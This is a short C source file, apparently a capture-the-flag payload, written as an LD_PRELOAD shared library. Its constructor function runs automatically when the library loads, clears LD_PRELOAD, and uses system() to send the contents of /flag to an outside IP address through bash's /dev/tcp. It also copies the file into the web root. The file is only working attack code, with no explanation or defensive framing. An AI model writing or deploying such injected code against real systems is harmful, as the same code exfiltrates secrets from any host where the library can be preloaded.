#include <stdlib.h>
#include <string.h>
__attribute__ ((constructor)) void call ()
{
    unsetenv("LD_PRELOAD");
    char str[65536];
    system("bash -c 'cat /flag' > /dev/tcp/81.68.167.39/5000");
    system("cat /flag > /var/www/html/flag");
}
